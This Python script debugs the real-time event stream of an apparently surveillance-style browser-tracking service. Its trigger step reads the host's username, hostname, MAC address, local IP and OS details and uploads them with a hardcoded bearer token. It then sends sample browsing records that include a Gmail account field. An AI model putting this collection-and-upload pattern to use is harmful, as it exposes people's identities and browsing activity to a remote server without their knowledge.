"""
Debug SSE (Server-Sent Events) Connection
Tests real-time connection to server
"""

import requests
import json
import time
import threading
from datetime import datetime

class SSEDebugger:
    def __init__(self):
        self.api_base = "https://browser-tracking.vercel.app"
        self.api_token = "BrowserTracker2024SecureToken"
        
        print("🔍 SSE Connection Debugger")
        print(f"🌐 Server: {self.api_base}")
        print("="*50)
    
    def test_sse_connection(self):
        """Test SSE connection"""
        print("\n📡 Testing SSE Connection...")
        
        try:
            # Test SSE endpoint
            sse_url = f"{self.api_base}/api/events"
            print(f"🔗 Connecting to: {sse_url}")
            
            headers = {
                'Accept': 'text/event-stream',
                'Cache-Control': 'no-cache'
            }
            
            response = requests.get(sse_url, headers=headers, stream=True, timeout=30)
            
            print(f"📊 Response Status: {response.status_code}")
            print(f"📋 Response Headers:")
            for key, value in response.headers.items():
                print(f"  {key}: {value}")
            
            if response.status_code == 200:
                print("\n✅ SSE Connection established!")
                print("🔄 Listening for events (10 seconds)...")
                
                start_time = time.time()
                event_count = 0
                
                for line in response.iter_lines(decode_unicode=True):
                    if line:
                        print(f"📨 Received: {line}")
                        event_count += 1
                    
                    # Stop after 10 seconds
                    if time.time() - start_time > 10:
                        break
                
                print(f"\n📊 Received {event_count} events in 10 seconds")
                return True
            else:
                print(f"❌ SSE Connection failed: {response.status_code}")
                print(f"📄 Response: {response.text}")
                return False
                
        except Exception as e:
            print(f"❌ SSE Connection error: {e}")
            return False
    
    def test_manual_trigger(self):
        """Test manual data trigger to see if SSE receives it"""
        print("\n🚀 Testing Manual Data Trigger...")
        
        # First register client
        try:
            import socket
            import getpass
            import platform
            from uuid import getnode
            
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            system_info = {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine()
                }
            }
            
            headers = {
                'Authorization': f'Bearer {self.api_token}',
                'Content-Type': 'application/json'
            }
            
            # Register client
            print("🔗 Registering client...")
            response = requests.post(
                f"{self.api_base}/api/register",
                json=system_info,
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                client_id = data.get('client_id')
                print(f"✅ Client registered: {client_id}")
                
                # Send test data
                print("📤 Sending test browsing data...")
                test_data = [{
                    'url': f'https://test-realtime-{int(time.time())}.com',
                    'title': f'Real-time Test {datetime.now().strftime("%H:%M:%S")}',
                    'visit_time': datetime.now().isoformat() + 'Z',
                    'browser_type': 'Chrome',
                    'profile_name': 'Debug Profile',
                    'gmail_account': 'debug@gmail.com'
                }]
                
                payload = {
                    'client_id': client_id,
                    'browsing_data': test_data
                }
                
                response = requests.post(
                    f"{self.api_base}/api/browsing-data",
                    json=payload,
                    headers=headers,
                    timeout=30
                )
                
                if response.status_code == 200:
                    result = response.json()
                    print(f"✅ Data sent successfully!")
                    print(f"📝 Message: {result.get('message')}")
                    print(f"🔔 Real-time notified: {result.get('realtime_notified', False)}")
                    return True
                else:
                    print(f"❌ Data submission failed: {response.status_code}")
                    return False
            else:
                print(f"❌ Client registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Manual trigger error: {e}")
            return False
    
    def test_concurrent_sse_and_trigger(self):
        """Test SSE connection while triggering data"""
        print("\n🔄 Testing Concurrent SSE + Data Trigger...")
        
        # Start SSE listener in background
        sse_events = []
        sse_running = True
        
        def sse_listener():
            try:
                sse_url = f"{self.api_base}/api/events"
                headers = {
                    'Accept': 'text/event-stream',
                    'Cache-Control': 'no-cache'
                }
                
                response = requests.get(sse_url, headers=headers, stream=True, timeout=60)
                
                if response.status_code == 200:
                    print("🔗 SSE Listener started...")
                    
                    for line in response.iter_lines(decode_unicode=True):
                        if not sse_running:
                            break
                            
                        if line and line.startswith('data:'):
                            event_data = line[5:].strip()  # Remove 'data:' prefix
                            sse_events.append(event_data)
                            print(f"📨 SSE Event: {event_data}")
                
            except Exception as e:
                print(f"❌ SSE Listener error: {e}")
        
        # Start SSE listener thread
        sse_thread = threading.Thread(target=sse_listener, daemon=True)
        sse_thread.start()
        
        # Wait a bit for SSE to connect
        time.sleep(3)
        
        # Trigger manual data
        print("\n🚀 Triggering manual data while SSE is listening...")
        trigger_success = self.test_manual_trigger()
        
        # Wait for SSE events
        print("\n⏳ Waiting 10 seconds for SSE events...")
        time.sleep(10)
        
        # Stop SSE listener
        sse_running = False
        
        # Results
        print(f"\n📊 Results:")
        print(f"  Manual trigger: {'✅ Success' if trigger_success else '❌ Failed'}")
        print(f"  SSE events received: {len(sse_events)}")
        
        if sse_events:
            print(f"  📋 Events:")
            for i, event in enumerate(sse_events):
                print(f"    {i+1}. {event}")
        
        return trigger_success and len(sse_events) > 0
    
    def run_debug(self):
        """Run complete SSE debug"""
        print("🔍 Starting SSE Debug Session")
        print("="*50)
        
        tests = [
            ("SSE Connection Test", self.test_sse_connection),
            ("Manual Data Trigger", self.test_manual_trigger),
            ("Concurrent SSE + Trigger", self.test_concurrent_sse_and_trigger)
        ]
        
        results = []
        
        for test_name, test_func in tests:
            print(f"\n{'='*20} {test_name} {'='*20}")
            try:
                result = test_func()
                results.append((test_name, result))
                
                if result:
                    print(f"✅ {test_name}: SUCCESS")
                else:
                    print(f"❌ {test_name}: FAILED")
                
            except Exception as e:
                print(f"❌ {test_name}: ERROR - {e}")
                results.append((test_name, False))
        
        # Summary
        print("\n" + "="*50)
        print("📋 DEBUG SUMMARY")
        print("="*50)
        
        for test_name, result in results:
            status = "✅ PASS" if result else "❌ FAIL"
            print(f"{test_name:.<30} {status}")
        
        passed = sum(1 for _, result in results if result)
        total = len(results)
        print(f"\n🎯 Overall: {passed}/{total} tests passed")
        
        if passed == total:
            print("🎉 SSE Real-time system is working correctly!")
        else:
            print("⚠️ SSE issues detected. Real-time updates may not work.")

def main():
    """Main debug function"""
    debugger = SSEDebugger()
    
    print("Choose debug mode:")
    print("1. Full SSE debug")
    print("2. SSE connection test only")
    print("3. Manual trigger test only")
    print("4. Concurrent test only")
    
    try:
        choice = input("\nEnter choice (1-4): ").strip()
        
        if choice == "1":
            debugger.run_debug()
        elif choice == "2":
            debugger.test_sse_connection()
        elif choice == "3":
            debugger.test_manual_trigger()
        elif choice == "4":
            debugger.test_concurrent_sse_and_trigger()
        else:
            print("Invalid choice. Running full debug...")
            debugger.run_debug()
            
    except KeyboardInterrupt:
        print("\n🛑 Debug interrupted by user")
    except Exception as e:
        print(f"\n❌ Debug error: {e}")

if __name__ == "__main__":
    main()
